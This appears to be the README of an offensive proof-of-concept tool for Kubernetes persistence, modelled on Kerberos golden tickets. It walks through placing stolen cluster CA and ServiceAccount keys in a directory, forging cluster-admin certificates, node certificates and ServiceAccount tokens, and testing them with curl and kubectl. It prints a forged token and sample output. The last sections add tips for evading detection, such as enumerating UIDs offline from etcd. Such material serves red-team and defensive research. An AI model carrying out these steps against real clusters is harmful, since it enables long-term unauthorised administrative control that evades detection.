# Kubernetes Spoofilizer

Inspired by [Kerberos Golden Tickets](https://attack.mitre.org/techniques/T1558/001/), this proof-of-concept code allows you to forge Kubernetes administrative user certificates, node certificates, and ServiceAccount tokens on a long-term basis (of course, this can only be done once a cluster's control plane is compromised and the appropriate keys are stolen from it).  Effectively, this would allow an attacker to persist access into the cluster, regardless of the normal certificate and token expiration times (1 year, and 1 hour, respectively).

Prior to Kubernetes v1.22 (released August 2021), SA tokens did not have any expiration(!).  Hence, obtaining long-term access was very straightforward in older releases.  Starting in v1.22, however, SA tokens would expire one hour after their creation.  For this reason, the SA token forging functionality of this tool is only relevant against clusters running v1.22 or later.  The user and node certificate forging functionality, however, can be used against all versions.

Additionally, observe that this tool cannot be used against any cloud-managed cluster that hides its control plane nodes (including AWS EKS, Azure AKS, and GCP GKE), because there is likely no way to obtain the necessary keys in the event of a full cluster compromise.

## Setup

To start, ensure that the `cryptography` Python module is installed (`pip install --user cryptography`), along with the `openssl` command-line tool.

In order to forge user and node certificates, we'll need the cluster's Certificate Authority certificate and private key.  These typically live in `/etc/kubernetes/pki/` at `ca.crt` and `ca.key`, respectively.  In order to forge ServiceAccount tokens, we'll also need `sa.key` from the same directory.

Once those three files are placed in a local directory, we'll need to pull the full list of ServiceAccounts from the API server so we can record their UIDs (these are necessary in order to forge SA tokens later on; they appear to be random and unguessable).  Run the following command using the local directory path holding the CA and SA keys:
```
$ ./k8s_spoofilizer.py --server https://kube-api:6443/ --update-uid-cache key_dir/

cluster-admins_kubernetes-admin.crt/key not found in directory key_dir/. Generating them now...
Creating a user certificate with a cluster role of cluster-admins and a username of kubernetes-admin...
[...]
Successfully created key_dir/cluster-admins_kubernetes-admin.crt and key_dir/cluster-admins_kubernetes-admin.key!

The certificate can be tested with: curl https://kube-api:6443/apis/authentication.k8s.io/v1/selfsubjectreviews --cacert key_dir/ca.crt --cert key_dir/cluster-admins_kubernetes-admin.crt --key key_dir/cluster-admins_kubernetes-admin.key -X POST -H "Content-Type: application/yaml" -d '{"apiVersion":"authentication.k8s.io/v1","kind":"SelfSubjectReview"}'

A kubeconfig file has been created in key_dir/kubeconfig_cluster-admins_kubernetes-admin. Test it with: kubectl --kubeconfig=key_dir/kubeconfig_cluster-admins_kubernetes-admin auth whoami

Requesting list of all ServiceAccounts...
Recieved 50 ServiceAccounts.
Successfully updated UID cache in key_dir/uid_cache.json.
[...]
```

The last step in the setup process is to use `--test` to double-check that we have everything we need for long-term persistence:
```
$ ./k8s_spoofilizer.py --test key_dir/

Testing that all necessary data is present in key_dir/...
  [+] CA certificate (key_dir/ca.crt) is present.
  [+] CA private key (key_dir/ca.key) is present.
  [+] ServiceAccount private key (key_dir/sa.key) is present.
  [+] Cached server URL file (key_dir/api_server_url.txt) exists and contains a proper URL.
  [+] Internal URL file (key_dir/internal_dns_url.txt) exists and contains a proper URL.
  [+] UID cache (key_dir/uid_cache.json) exists and has 50 entries.
```

## Forging ServiceAccount Tokens

The following command will forge a token for the `deployment-controller` ServiceAccount in the `kube-system` namespace:
```
$ ./k8s_spoofilizer.py --forge-sa-token kube-system/deployment-controller key_dir/
[+] Found UID in cache for kube-system/deployment-controller: ed0192c9-6764-46c8-9a4d-7210253782dd

Unsigned & unencoded JWT:
{
  "alg": "RS256",
  "kid": ""
}
{
  "aud": [
    "https://kubernetes.default.svc.cluster.local"
  ],
  "exp": 1740257684,
  "iat": 1740254084,
  "iss": "https://kubernetes.default.svc.cluster.local",
  "jti": "7ff720a1-285e-4518-b20f-586a752db523",
  "kubernetes.io": {
    "namespace": "kube-system",
    "serviceaccount": {
      "name": "deployment-controller",
      "uid": "ed0192c9-6764-46c8-9a4d-7210253782dd"
    },
    "nbf": 1740254084,
    "sub": "system:serviceaccount:kube-system:deployment-controller"
  }
}

Forged ServiceAccount token for kube-system/deployment-controller with TTL of 3600 seconds:
eyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzQwMjU3Njg0LCJpYXQiOjE3NDAyNTQwODQsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiN2ZmNzIwYTEtMjg1ZS00NTE4LWIyMGYtNTg2YTc1MmRiNTIzIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJkZXBsb3ltZW50LWNvbnRyb2xsZXIiLCJ1aWQiOiJlZDAxOTJjOS02NzY0LTQ2YzgtOWE0ZC03MjEwMjUzNzgyZGQifSwibmJmIjoxNzQwMjU0MDg0LCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06ZGVwbG95bWVudC1jb250cm9sbGVyIn19.sIL-G3VaXuKOZvByFN-qZCrSK9ppUSP8HJg4wVP9NVzng2uA5afCZjJhdSFEmDSYN4TXWbE1pI9rcRk2ytQakYIbH-JzR0JQjcd5TKZbQxKrVPshaeRhFSvpk0B-2k4mY-ooGOZ-QtezBxeM0K9SAaFxGMjnCpYJSGeyeLg7mFErROJZSBEXyCnLMISRoSpddOiv3_xWMH9N1AKGurhOWFZfIEwKAC4FBM2hR_z3RBgjhP2WWHKWjWV_bd-w9QwistH3iPKydP5bVufQgOipwzAdITCmyMZklp-ldLapOPPu0f43PzQunhY8SnkeOQ4ABm8oy4lgWe1JKNKZnBHhQQ

[+] This token can be tested by putting it into an environment variable named $TOKEN, then running:
curl https://kube-api:6443/apis/authentication.k8s.io/v1/selfsubjectreviews --cacert key_dir//ca.crt -X POST -H "Content-Type: application/yaml" -H "Authorization: Bearer $TOKEN" -d '{"apiVersion":"authentication.k8s.io/v1","kind":"SelfSubjectReview"}'

[+] A kubeconfig file has been created in key_dir/kubeconfig_token_kube-system_deployment-controller. Test it with:
kubectl --kubeconfig=key_dir/kubeconfig_token_kube-system_deployment-controller auth whoami
```

The output above includes the forged SA token, but the tool also packaged it into a kubeconfig so we can easily use `kubectl`:
```
$ kubectl --kubeconfig=key_dir/kubeconfig_token_kube-system_deployment-controller auth whoami
ATTRIBUTE                                           VALUE
Username                                            system:serviceaccount:kube-system:deployment-controller
UID                                                 ed0192c9-6764-46c8-9a4d-7210253782dd
Groups                                              [system:serviceaccounts system:serviceaccounts:kube-system system:authenticated]
Extra: authentication.kubernetes.io/credential-id   [JTI=7ff720a1-285e-4518-b20f-586a752db523]
```

Success!


## Forging User Certificates

The following command will create a certificate with the username of `kubernetes-admin` bound to the `cluster-admins` role, effectively granting *administrative rights*:
```
$ ./k8s_spoofilizer.py --forge-user-cert cluster-admins/kubernetes-admin key_dir/
Creating a user certificate with a cluster role of cluster-admins and a username of kubernetes-admin...
[...]
Successfully created key_dir/cluster-admins_kubernetes-admin.crt and key_dir/cluster-admins_kubernetes-admin.key!

The certificate can be tested with: curl https://kube-api:6443/apis/authentication.k8s.io/v1/selfsubjectreviews --cacert key_dir/ca.crt --cert key_dir/cluster-admins_kubernetes-admin.crt --key key_dir/cluster-admins_kubernetes-admin.key -X POST -H "Content-Type: application/yaml" -d '{"apiVersion":"authentication.k8s.io/v1","kind":"SelfSubjectReview"}'

A kubeconfig file has been created in key_dir/kubeconfig_cluster-admins_kubernetes-admin. Test it with: kubectl --kubeconfig=key_dir/kubeconfig_cluster-admins_kubernetes-admin auth whoami
```

Observe that the tool helpfully created a kubeconfig file for us.  Now we can use the standard `kubectl` client to run commands easily!:
```
$ kubectl --kubeconfig=key_dir/kubeconfig_cluster-admins_kubernetes-admin auth whoami
ATTRIBUTE                                           VALUE
Username                                            kubernetes-admin
Groups                                              [kubeadm:cluster-admins system:authenticated]
Extra: authentication.kubernetes.io/credential-id   [X509SHA256=103e3f6017b61903bcb394f488a2647bad65e85c2736900fd191602d0efc2f7d]
```

Note that, because Kubernetes does not maintain a database of users, a certificate with any username whatsoever would be considered valid.  Kubernetes simply authenticates based on the certificate signature coming from its own CA, and authorizes based on the role listed in the certificate's Distinguished Name (DN) field (in this case, `cluster-admins`).

## Forging Node Certificates

A certificate that appears to belong to a node named `phantomnode` can be forged with:
```
$ ./k8s_spoofilizer.py --forge-node-cert phantomnode key_dir/
Creating a node certificate with a group of system:nodes and a name of phantomnode...
[...]
Successfully created key_dir/node_phantomnode.crt and key_dir/node_phantomnode.key!

The certificate can be tested with: curl https://kube-api:6443/apis/authentication.k8s.io/v1/selfsubjectreviews --cacert key_dir/ca.crt --cert key_dir/node_phantomnode.crt --key key_dir/node_phantomnode.key -X POST -H "Content-Type: application/yaml" -d '{"apiVersion":"authentication.k8s.io/v1","kind":"SelfSubjectReview"}'

A kubeconfig file has been created in key_dir/kubeconfig_node_phantomnode. Test it with: kubectl --kubeconfig=key_dir/kubeconfig_node_phantomnode auth whoami
```

Now let's test it:
```
$ kubectl --kubeconfig=key_dir/kubeconfig_node_phantomnode auth whoami
ATTRIBUTE                                           VALUE
Username                                            system:node:phantomnode
Groups                                              [system:nodes system:authenticated]
Extra: authentication.kubernetes.io/credential-id   [X509SHA256=494e0e18cfa045f7b6782050390a89697d1a0fee7540fa606627fa1a3399bbce]
```

As you can see, the node name does not need to belong to an existing node in the cluster; Kubernetes v1.32 seems content to treat any node name as valid.

Depending on the cluster configuration, nodes typically do not have access to many functions by default.  Casual experimentation shows that nodes can enumerate `services` and `runtimeclasses.node.k8s.io` objects.  However, given that many third-party plugins create their own objects, and sometimes modify permissions, there may be cases where node certificates can access privileged information.

Perhaps using node certificates in those cases can evade detection better than standard user certificates?  Hmm...

## Offline UID Enumeration

Observe that, during setup, all ServiceAccounts are enumerated through the API server in order to obtain their UIDs for later token forgery (this is done with the `--update-uid-cache` option).  A stealth attacker may instead choose to take another approach to avoid detection.  Namely, the UIDs may be enumerated offline by extracting them directly from the `etcd` database.  In that case, the [Auger](https://github.com/etcd-io/auger) project may be useful for decoding the entries into a human-readable format.  Such an exercise is left to the reader.
